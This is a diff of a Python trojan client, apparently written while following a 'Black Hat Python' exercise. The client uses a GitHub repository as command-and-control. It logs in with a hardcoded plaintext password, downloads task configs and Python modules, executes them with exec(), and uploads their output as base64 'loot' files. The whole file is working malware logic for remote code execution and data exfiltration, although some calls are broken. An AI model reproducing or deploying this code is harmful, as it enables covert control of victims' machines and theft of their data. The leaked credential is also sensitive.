@@ -1,14 +1,17 @@
 #!/usr/bin/python3
-import sys, os
-import datetime, random, imp
+import sys, os, imp
+import datetime, random
 import threading, queue
 import base64
 
+from time import sleep
 from simplejson import loads
 from github3 import login
 
+
 ID="test"
 GIT_URL="http://github.com/iwakura1ain/BlackHatPython-Examples"
+MODULE_URL="/home/dks/Development/Python/blackhat-python"
 
 CONFIG_DIR="trojan_command/config/trojan_conf.json"
 CONFIG=[]
@@ -17,71 +20,138 @@ LOOT_DIR="trojan_command/loot/%s/" % ID
 LOOT_NUM = 1
 
 MODULE_DIR="trojan_command/modules"
-
 TROJAN_MODULES=[]
-TASK_QUEUE=queue.Queue()
 
 
-class GitImporter(object):
+class Importer():
     def __init__(self):
         self.current_module_code = ""
 
-    def find_module(self, name, path=None):
-        new_module = GetFile(path + "/" + name)
-        if new_module is not None:
-            self.current_module_code = base64.b64decode(new_module)
+    def FindModule(self, name, path=None):
+        new_module_code = GetFile(path + "/" + name + ".py")
+        #new_module_code = ReadFile(path + "/" + name + ".py")
+
+        return self.VerifyModule(new_module_code)
+
+    def VerifyModule(self, new_module_code):  #TODO: implement code checking
+        if new_module_code is not None:
+            self.current_module_code = new_module_code
+            print(new_module_code)
             return True
         else:
+            return False        
+
+    def LoadModule(self, name):
+        module = imp.new_module(name)
+        exec(self.current_module_code, module.__dict__)
+        sys.modules[name] = module        
+"""
+class Task(object):
+    def __init__(self, task_name, task_args):
+        self.task_name = task_name
+        self.task_args = task_args
+        self.task_thread = None
+
+    def __hash__(self):
+        return hash((self.task_name, "".join(self.task_args) ))
+
+    def __eq__(self, other):
+        if not isinstance(other, type(self)):
             return False
 
-    def load_module(self, name):
-        module = imp.new_module(name)
-        exec(self.current_module_code) in module.__dict__
+        return (self.task_name == other.task_name) and (self.task_args == other.task_args) #and (self.task_thread == other.task_thread)
 
+    def __contains__(self, other):
+        flag = False
+        for task_instance in other:
+            if(self == task_instance):
+                return True
+
+        return False              
+
+    def InitThread(self):
+        self.task_thread = threading.Thread(target=RunModule, args=(self.task_name, self.task_args,))
+"""
+
+class Task(object):
+    def __init__(self, task_name, task_args):
+        self.task_name = task_name
+        self.task_flags = [False,False,False]
+        self.task_args = task_args
+        self.task_thread = None
+
+    def __hash__(self):
+        return hash((self.task_name, "".join(self.task_args) ))
+
+    def __eq__(self, other):
+        if not isinstance(other, type(self)):
+            return False
+
+        return (self.task_name == other.task_name) and (self.task_args == other.task_args) #and (self.task_thread == other.task_thread)
+
+    def __contains__(self, other):
+        flag = False
+        for task_instance in other:
+            if(self == task_instance):
+                return True
+
+        return False              
+
+    def InitThread(self):
+        self.task_thread = threading.Thread(target=RunModule, args=(self.task_name, self.task_args, self.task_flags,))
+            
 class TaskSyncer:
     def __init__(self):
         self.running_tasks = set()
-        self.running_threads = dict()
 
-    def SyncTasks(self, new_tasks):
+    def SyncTasks(self, requested_tasks): #scheduled_tasks -> list of dicts
         new_tasks = set()
-        new_threads = dict()
 
-        #sync new tasks and reuse old threads
-        for task in new_tasks:
+        for old_task in self.running_tasks:
+            if old_task in requested_tasks:
+                new_tasks.add(old_task)
+                print("Same task requested...")
+            else:
+                try:
+                    print("Trying to exit task...")
+                    old_task.task_flags[1] = True #flag to kill task
+                except:
+                    print("Task already exited...")
+                    continue                    
+
+        for task in requested_tasks:
             new_tasks.add(task)
-            if task in self.running_tasks:  #task was previously running
-                #reuse previously running thread
-                new_threads[task["name"]] = self.running_threads[task["name"]]
-                
-            else:  #brand new task
-                #brand new thread entry
-                t = threading.Thread(target=RunModule,
-                                     args=(task["name"], task["args"],))
 
-                new_threads[task["name"]] = t
-
-        #stop unused old threads
-        for t in self.running_threads:
-            if t not in new_threads:
-                t._stop()
-
+        for tasks in new_tasks:
+            tasks.InitThread()
+        
         self.running_tasks = new_tasks
-        self.running_threads = new_threads
+        print("New taskset initialized!")
 
     def RunAll(self):
-        for t in self.running_threads:
-            try:
-                t.start()
-            except RuntimeError: #reused old thread
+        print("Starting new taskset!")
+        for task in self.running_tasks:
+            if task.task_flags[0]:
                 continue
-                  
-def RunModule(module, args):
-    result = sys.modules[module].run(args)
-    StoreLoot(result)
+            else:
+                task.task_flags[0] = True
+                task.task_thread.start()
+                
+def ReadFile(dir):
+    f = open(dir, "r")
+    s = f.read()
+    f.close()
+
+    return s
+            
+def RunModule(module, args, flags):
+    print("Running module: %s" % module)
+    result = sys.modules[module].run(args, flags)
+    StoreLoot("\n" + module + ": " + result + "\n")
     return
         
 def ConnectToGithub():
+    print("Connecting to github...")
     gh = login(username="iwakura1ain", password="912ehd406gh")
     repo = gh.repository("iwakura1ain", "BlackHatPython-Examples")
     #branch = repo.branch("main")
@@ -90,46 +160,54 @@ def ConnectToGithub():
 
 def GetFile(dir):
     gh, repo  = ConnectToGithub()
+    print("Downloading: %s" % dir)
     f = repo.file_contents(dir)
     
-    return f
+    return f.content
 
 def GetConfig():
     global CONFIG
     
-    importer = GitImporter()
-    scheduled_modules = set()
+    importer = Importer()
+    scheduled_tasks = []
 
     while True:
-        datetime.time.sleep(random.randint(1,10))
+        print("Attempting to receive taskset...")
         
-        config = loads(base64.b64decode(GetFile(CONFIG_DIR).contents)) #simplejson, base64 used
+        #config = loads(base64.b64decode(GetFile(CONFIG_DIR))) #simplejson, base64 used
+        config = loads(ReadFile("/home/dks/Development/Python/blackhat-python/" + CONFIG_DIR))
         if(CONFIG != config):
             CONFIG = config
             print("New taskset received!")
             
             for task in CONFIG:
                 mod = task["module"]
+                args = task["args"]
                 
                 if(mod not in TROJAN_MODULES):
                     print("Requires module import...")
-                    if importer.find_module(mod):
-                        importer.load_module(mod)
+                    if importer.FindModule(mod, MODULE_DIR):
+                        importer.LoadModule(mod)
                         TROJAN_MODULES.append(mod)
                                                 
                     else:
                         print("Module not found...")
                         continue
                 
-                new_task = {"name":task["module"], "args":task["args"]}
-                scheduled_modules.add(new_task)
+                new_task = Task(task["module"], task["args"])
+                scheduled_tasks.append(new_task)
                     
-            return scheduled_modules
-        
+            return scheduled_tasks
+
+        else:
+            print("No new task added...")
+
+        sleep(random.randint(10,20))
+            
 def StoreLoot(loot):
     global LOOT_NUM
     
-    gh, repo, branch = ConnectToGithub()
+    gh, repo = ConnectToGithub()
     remote_path = "%s/%d-%s.txt" % (LOOT_DIR, LOOT_NUM, datetime.time.strftime("%H%M"))
     repo.create_file(remote_path, datetime.date.strftime("%Y-%m-%d"), base64.b64encode(loot))
     LOOT_NUM += 1
@@ -137,12 +215,11 @@ def StoreLoot(loot):
     return
 
 def main():
-    sys.meta_path = [GitImporter()]
     running_modules = TaskSyncer()
     
     while True:
-        scheduled_modules = GetConfig() #blocks until new config is loaded
-        running_modules.SyncTasks(scheduled_modules) 
+        requested_tasks = GetConfig() #retries randomly until new config is loaded
+        running_modules.SyncTasks(requested_tasks) 
         running_modules.RunAll()
         
         
